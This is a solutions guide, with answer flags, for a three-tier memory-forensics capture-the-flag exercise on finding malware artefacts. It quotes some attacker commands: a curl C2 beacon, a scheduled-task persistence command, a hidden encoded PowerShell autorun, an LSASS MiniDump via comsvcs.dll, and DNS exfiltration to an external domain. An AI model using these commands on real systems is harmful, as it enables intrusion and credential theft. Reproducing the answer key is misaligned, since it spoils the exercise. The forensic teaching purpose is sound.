## Solutions

### Easy Tier — "Patient Zero"

**Setup**: Download `romeo-easy-patient-zero.raw.gz`. Decompress before analysis:
```bash
gunzip romeo-easy-patient-zero.raw.gz
# or decompress on the fly:
gunzip -c romeo-easy-patient-zero.raw.gz | strings | grep <pattern>
```

> **Note**: `strings | grep` is the primary analysis method for this tier.
> Volatility 3 (`linux.psaux`, etc.) requires a matching ISF kernel symbol file
> and will not work without one for this image.

#### FLAG 1 — `susp1c10us_pr0c3ss_f0und` (100 pts)

A suspicious process is running from `/tmp/` instead of a system directory — a classic IOC. Its command-line arguments contain the flag.

**strings + grep**:
```bash
strings romeo-easy-patient-zero.raw | grep "susp1c10us"
# or search for the binary name
strings romeo-easy-patient-zero.raw | grep "/tmp/svchost"
```

Both return the full command line showing the suspicious process and its `-config` argument.

**Flag**: `susp1c10us_pr0c3ss_f0und`

#### FLAG 2 — `p0w3rsh3ll_d3c0d3d` (200 pts)

A script running in memory contains a base64-encoded configuration string. Find the encoded value and decode it.

**Step 1 — Find the base64 string**:
```bash
strings romeo-easy-patient-zero.raw | grep "ENCODED_CONFIG"
# Returns the script line: ENCODED_CONFIG = "cDB3M3JzaDNsbF9kM2MwZDNk"
```

Or grep for the start of the base64 value directly:
```bash
strings romeo-easy-patient-zero.raw | grep "cDB3"
# Returns: ENCODED_CONFIG = "cDB3M3JzaDNsbF9kM2MwZDNk"
```

**Step 2 — Decode it**:
```bash
echo "cDB3M3JzaDNsbF9kM2MwZDNk" | base64 -d
# Returns: p0w3rsh3ll_d3c0d3d
```

**Flag**: `p0w3rsh3ll_d3c0d3d`

#### FLAG 3 — `m4cr0_c2_c4llb4ck` (300 pts)

Malware makes callbacks to a C2 server. The flag is embedded in the URL as a tracking token.

```bash
strings romeo-easy-patient-zero.raw | grep "token="
# Returns lines like:
#   curl -s -o /dev/null "${C2_URL}?bot=${BOT_ID}&token=m4cr0_c2_c4llb4ck&ts=$(date +%s)"
#   GET /check?bot=ws-reception-01-a1b2c3d4&token=m4cr0_c2_c4llb4ck&ts=1743739200 HTTP/1.1
```

The flag value is the `token=` parameter value.

**Flag**: `m4cr0_c2_c4llb4ck`

---

### Medium Tier — "Lateral Move"

**Setup**:
```bash
tar xzf romeo-medium-lateral-move.tar.gz
cd romeo-medium-lateral-move/
cat README-ANALYST.txt  # Read the briefing first
```

#### FLAG 1 — `4n0m4l0us_c0nn3ct10n` (200 pts)

Check network connections for suspicious outbound traffic and correlate with threat intel.

**Step 1 — Examine network scan output**:
```bash
cat vol3-netscan.txt | grep ESTABLISHED
# Note: svcnet.exe has two ESTABLISHED connections to 185.141.27.93:443
```

**Step 2 — Cross-reference threat intel**:
```bash
cat analyst-ioc-notes.txt | grep "Callback identifier"
# Returns: Callback identifier: 4n0m4l0us_c0nn3ct10n
```

**Key observation**: `svcnet.exe` (PID 3412) running from `C:\Users\d.kim\AppData\Local\Temp\` — wrong path for a system service. The process tree shows it spawned from `svchost.exe`, which spawned `cmd.exe` → `powershell.exe`.

**Flag**: `4n0m4l0us_c0nn3ct10n`

#### FLAG 2 — `p3rs1st3nc3_d3t3ct3d` (350 pts)

The attacker installed a scheduled task for persistence.

**Step 1 — Spot the suspicious scheduled task command**:
```bash
grep "schtasks" vol3-cmdline.txt
# Shows: schtasks /create /tn "Microsoft\Windows\NetTrace\GatherInfo" ...
```

**Step 2 — Examine the extracted task XML**:
```bash
cat extracted/scheduled_task.xml | grep -A2 Description
# Returns: <Description>p3rs1st3nc3_d3t3ct3d</Description>
```

**Flag**: `p3rs1st3nc3_d3t3ct3d`

#### FLAG 3 — `r3g1stry_4ut0run_f0und` (400 pts)

The attacker added a registry autorun entry. The value is obfuscated with PowerShell's `-enc` (base64 encoded command) parameter.

**Step 1 — Find the suspicious Run key**:
```bash
grep -A20 "CurrentVersion\\\\Run" vol3-printkey.txt
# Note the "WindowsNetTrace" value with "-enc" parameter
```

**Step 2 — Extract the base64 value**:
```bash
grep "WindowsNetTrace" vol3-printkey.txt
# ...powershell -w hidden -nop -enc <BASE64_HERE>
```

**Step 3 — Decode it**:
```bash
echo "<BASE64_VALUE>" | base64 -d
# Returns: r3g1stry_4ut0run_f0und
```

Or in Python:
```python
import base64
print(base64.b64decode("<BASE64_VALUE>").decode())
```

**Flag**: `r3g1stry_4ut0run_f0und`

#### FLAG 4 — `cr3d3nt14l_dump_4n4lyz3d` (500 pts)

The attacker dumped LSASS memory to harvest credentials (visible via `rundll32.exe comsvcs.dll MiniDump` in cmdline output). The extracted strings contain cleartext credentials.

```bash
cat extracted/lsass_strings.txt | grep -A5 "svc_deploy"
# Look for the wdigest Password field under svc_deploy
```

**Key finding**: Wdigest stores credentials in cleartext when enabled. The `svc_deploy` service account has cleartext password visible.

**Flag**: `cr3d3nt14l_dump_4n4lyz3d`

---

### Hard Tier — "Exfil and Burn"

**Setup**:
```bash
tar xzf romeo-hard-exfil-burn.tar.gz
cd romeo-hard-exfil-burn/
cat README-ANALYST.txt  # Read the briefing first
```

#### FLAG 1 — `1nj3ct3d_sh3llc0d3_x0r` (300 pts)

`vol3-malfind.txt` shows process injection — a private memory region with `PAGE_EXECUTE_READWRITE` permissions (legitimate code is `PAGE_EXECUTE_READ`). The injected shellcode contains a single-byte XOR-encoded string.

**Step 1 — Identify the suspicious region**:
```bash
grep -A5 "PAGE_EXECUTE_READWRITE" vol3-malfind.txt
# powershell.exe has injected code with XOR-encoded payload
```

**Step 2 — XOR decode the injected region**:

The note in `vol3-malfind.txt` identifies the XOR'd region as `0x0040001d-0x00400032` (22 bytes starting after the shellcode NOP sled). The hint lists candidate keys including `0x42`.

```python
import re

with open('vol3-malfind.txt') as f:
    content = f.read()

# Extract hex bytes ONLY from the powershell.exe region (0x00400000 lines)
hex_bytes = []
for line in content.split('\n'):
    m = re.match(r'(0x0040[0-9a-f]+)\s{2}((?:[0-9a-f]{2}\s)+)', line)
    if m:
        addr = int(m.group(1), 16)
        for i, h in enumerate(m.group(2).split()):
            hex_bytes.append((addr + i, int(h, 16)))

# Try XOR keys from the hint, look for printable flag-shaped output
for key in [0x41, 0x42, 0x43, 0x55, 0xAA, 0xFF]:
    decoded = ''.join(chr(b ^ key) if 32 <= (b ^ key) < 127 else '' for _, b in hex_bytes)
    if len(decoded) > 8 and '_' in decoded:
        print(f"Key 0x{key:02x}: {decoded}")
```

This produces readable output only for key `0x42`, revealing the flag embedded in the printable substring.

**Flag**: `1nj3ct3d_sh3llc0d3_x0r`

#### FLAG 2 — `3xf1l_4rch1v3_r3c0v3r3d` (450 pts)

The attacker used `certutil.exe` (visible in pslist/cmdline) to base64-encode a 7z archive for exfiltration. The encoded blob was recovered from the staging directory.

**Step 1 — Decode the base64 blob**:
```python
import base64
with open('extracted/staging/data.b64') as f:
    decoded = base64.b64decode(f.read())
print(decoded.decode())
```

Or with system `base64` (syntax varies by OS):
```bash
# Linux
base64 -d extracted/staging/data.b64
# macOS
base64 -D -i extracted/staging/data.b64
```

**Step 2 — Find the flag in the archive listing**:

The 7z listing shows the files staged for exfiltration. One "file" has the flag value as its filename.

**Flag**: `3xf1l_4rch1v3_r3c0v3r3d`

#### FLAG 3 — `t1m3st0mp_d3t3ct3d` (550 pts)

The attacker ran `timestomp.exe` (visible in pslist at 08:45:33) to alter file timestamps and cover tracks. Cross-referencing two timeline sources reveals the anomaly.

**Key concept**: NTFS stores timestamps in two places:
- `$STANDARD_INFORMATION` (SI) — user-visible timestamps, easily modified
- `$FILE_NAME` (FN) — updated by the OS on file creation/move, harder to fake

When an attacker modifies SI timestamps but not FN timestamps, the discrepancy is a reliable detection signal.

**Step 1 — Check timeliner for suspicious files**:
```bash
grep "drivers" vol3-timeliner.txt
# Shows: 2026-01-15 10:22:14 — Windows\System32\drivers\<FLAG>.sys
```

**Step 2 — Check MFT parser for the same file**:
```bash
grep "drivers" vol3-mftparser.txt
# $FILE_NAME entry shows Created: 2026-03-17 08:45:18 (real creation time)
# $STANDARD_INFORMATION shows: 2026-01-15 10:22:14 (backdated!)
```

**Step 3 — Identify the anomaly**:

The `$FILE_NAME` timestamp (2026-03-17 08:45:18) doesn't match the `$STANDARD_INFORMATION` timestamp (2026-01-15 10:22:14). The attacker backdated the file to January to make it look like a legitimate driver. The filename of the suspicious `.sys` file **is** the flag.

```bash
grep -i "sys" vol3-mftparser.txt | grep "drivers"
```

**Flag**: `t1m3st0mp_d3t3ct3d`

#### FLAG 4 — `dns_3xf1l_r3c0nstruct3d` (700 pts)

`nslookup.exe` (PID 4264) was making unusual DNS queries to an external server (91.215.85.120, not the internal DC). The subdomain labels are base32-encoded data chunks being exfiltrated covertly over DNS.

**Step 1 — Identify the suspicious queries**:
```bash
grep "midnightraven" extracted/dns_queries.pcap.txt
# Shows: <CHUNK>.<INDEX>.exfil.midnightraven.net TXT queries
```

**Step 2 — Extract and sort the subdomain labels**:
```bash
grep "midnightraven" extracted/dns_queries.pcap.txt | awk '{print $6}' | sort -t. -k2 -n
```

**Step 3 — Concatenate the chunks in order**:
```python
import re, base64

with open('extracted/dns_queries.pcap.txt') as f:
    lines = f.readlines()

chunks = {}
for line in lines:
    m = re.search(r'(\w+)\.(\d+)\.exfil\.midnightraven\.net', line)
    if m:
        chunks[int(m.group(2))] = m.group(1)

# Reconstruct in order
encoded = ''.join(chunks[k] for k in sorted(chunks))

# Base32 decode (pad to multiple of 8)
padding = (8 - len(encoded) % 8) % 8
decoded = base64.b32decode(encoded.upper() + '=' * padding)
print(decoded.decode())
```

**Flag**: `dns_3xf1l_r3c0nstruct3d`

---